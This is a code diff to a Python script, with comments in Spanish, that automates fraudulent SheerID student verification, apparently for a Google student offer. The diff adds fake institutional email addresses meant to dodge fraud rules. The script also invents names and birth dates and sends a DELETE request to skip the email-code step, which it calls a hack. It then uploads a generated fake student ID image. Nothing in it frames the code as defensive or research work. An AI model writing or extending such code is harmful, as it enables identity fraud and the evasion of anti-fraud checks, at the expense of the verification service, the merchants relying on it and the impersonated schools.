@@ -4,6 +4,7 @@ import random
 import unicodedata
 import re
 import json
+import asyncio
 from . import config
 from .img_generator import generate_image
 from .name_generator import NameGenerator 
@@ -14,24 +15,13 @@ logger = logging.getLogger(__name__)
 class SheerIDVerifier:
     def __init__(self, verification_id):
         self.verification_id = verification_id
-        # Headers de Chrome REAL
+        # Headers Chrome Windows
         self.headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
             "Accept": "application/json",
             "Referer": f"https://services.sheerid.com/verify/{config.PROGRAM_ID}/",
-            "Origin": "https://services.sheerid.com",
-            "Sec-Ch-Ua": '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
-            "Sec-Ch-Ua-Mobile": "?0",
-            "Sec-Ch-Ua-Platform": '"Windows"',
-            "Sec-Fetch-Site": "same-origin",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Dest": "empty"
+            "Origin": "https://services.sheerid.com"
         }
-        
-        # SI TIENES UN PROXY, PONLO AQUÍ:
-        # proxies = "http://user:pass@ip:port"
-        # self.client = httpx.Client(headers=self.headers, proxies=proxies, timeout=30.0)
-        
         self.client = httpx.Client(headers=self.headers, timeout=30.0)
         self.device_fingerprint = ''.join(random.choices('0123456789abcdef', k=32))
 
@@ -51,14 +41,15 @@ class SheerIDVerifier:
             first = name_data['first_name']
             last = name_data['last_name']
             
-            # Edad joven para escuela técnica (18-24)
-            dob = f"200{random.randint(0,5)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}"
+            # --- CAMBIO IMPORTANTE: USAR EMAIL INSTITUCIONAL FALSO ---
+            # Esto evita el bloqueo inmediato de "fraudRulesReject".
             school = config.SCHOOLS[config.DEFAULT_SCHOOL_ID]
+            domain = school.get('domain', 'westerntech.edu')
             
-            # Email ULTRA NORMAL (Nada de palabras raras)
-            # Solo nombre.apellido + numeros random @ gmail/yahoo
-            domains = ["gmail.com", "yahoo.com", "outlook.com"]
-            email = self.sanitize_email(f"{first}.{last}{random.randint(10,9999)}@{random.choice(domains)}").lower()
+            # Generamos algo como: juan.perez22@westerntech.edu
+            email = self.sanitize_email(f"{first}.{last}{random.randint(10,99)}@{domain}").lower()
+            
+            dob = f"200{random.randint(0,5)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}"
 
             logger.info(f"🔧 TECH STUDENT: {first} {last} | {email}")
 
@@ -72,31 +63,35 @@ class SheerIDVerifier:
                 "metadata": {**config.METADATA, "verificationId": self.verification_id, "refererUrl": f"{config.SHEERID_BASE_URL}/verify/{config.PROGRAM_ID}/"}
             }
             
+            # PASO 1: ENVIAR DATOS
             url_step1 = f"{config.SHEERID_BASE_URL}/rest/v2/verification/{self.verification_id}/step/collectStudentPersonalInfo"
             resp1 = self.client.post(url_step1, json=payload)
             data1 = resp1.json()
             current_step = data1.get("currentStep")
 
-            # REINTENTO INTELIGENTE
-            if current_step == "collectStudentPersonalInfo":
-                logger.info("⚠️ Reintentando con otro email...")
-                payload["email"] = self.sanitize_email(f"{last}{first}{random.randint(1,99)}@gmail.com").lower()
-                resp1 = self.client.post(url_step1, json=payload)
-                data1 = resp1.json()
-                current_step = data1.get("currentStep")
-
+            # --- HACK PARA ROMPER EL LOOP ---
             if current_step == "emailLoop":
-                self.client.delete(f"{config.SHEERID_BASE_URL}/rest/v2/verification/{self.verification_id}/step/emailLoop")
+                logger.info("⚠️ Entramos al Loop (Código enviado). Intentando saltar a Documentos...")
+                
+                # Intentamos dos métodos para romper el loop:
+                
+                # Método A: DELETE al endpoint del loop (Simula clic en "Verificar de otra forma")
+                del_resp = self.client.delete(f"{config.SHEERID_BASE_URL}/rest/v2/verification/{self.verification_id}/step/emailLoop")
+                
+                # Actualizamos estado
                 status = self.client.get(f"{config.SHEERID_BASE_URL}/rest/v2/verification/{self.verification_id}").json()
                 current_step = status.get("currentStep")
+                logger.info(f"Estado post-salto: {current_step}")
 
+            # Si nos manda a error, es que nos detectaron
             if current_step == "error":
-                return {"success": False, "message": f"❌ BLOQUEADO: {data1.get('errorIds')}"}
+                return {"success": False, "message": f"❌ Error: {data1.get('errorIds')}"}
 
             if current_step == "success":
                  return {"success": True, "pending": False, "redirect_url": data1.get("redirectUrl"), "status": data1}
 
-            # PASO 2: Doc Upload
+            # PASO 2: SUBIR DOCUMENTO
+            # Si logramos romper el loop, deberíamos estar aquí
             if current_step == "docUpload":
                 logger.info(">> Subiendo Credencial WTC...")
                 img_bytes = generate_image(first, last)
@@ -110,6 +105,10 @@ class SheerIDVerifier:
                     final = self.client.post(f"{config.SHEERID_BASE_URL}/rest/v2/verification/{self.verification_id}/step/completeDocUpload").json()
                     return {"success": True, "pending": True, "redirect_url": final.get("redirectUrl"), "status": final}
             
+            # Si seguimos en emailLoop después de intentar borrarlo, estamos jodidos
+            if current_step == "emailLoop":
+                 return {"success": False, "message": "❌ No se pudo salir del Email Loop. Google exige el código."}
+
             return {"success": False, "message": f"Estado desconocido: {current_step}"}
 
         except Exception as e:
